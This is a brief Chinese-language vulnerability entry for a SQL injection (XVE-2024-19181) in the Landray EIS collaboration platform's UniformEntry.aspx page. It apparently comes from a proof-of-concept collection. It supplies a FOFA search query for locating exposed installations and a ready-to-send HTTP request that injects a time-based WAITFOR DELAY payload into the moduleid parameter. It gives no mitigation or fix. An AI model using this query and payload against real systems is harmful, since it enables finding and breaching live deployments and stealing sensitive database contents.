# 蓝凌EIS智慧协同平台UniformEntry.aspx存在SQL注入漏洞(XVE-2024-19181)

蓝凌EIS智慧协同平台是一款专为成长型企业打造的智慧办公云平台，深度融合了阿里钉钉的功能。该平台旨在通过增强组织的协同在线、业务在线和生态在线，提升企业的工作效率和管理便捷性。 蓝凌EIS智慧协同平台存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感数据。

## fofa

```yaml
icon_hash="953405444"||app="Landray-OA系统"
```

## poc

```yaml
GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1;WAITFOR+DELAY+'0:0:5'-- + HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)Gecko/20100101 Firefox/109.0
```

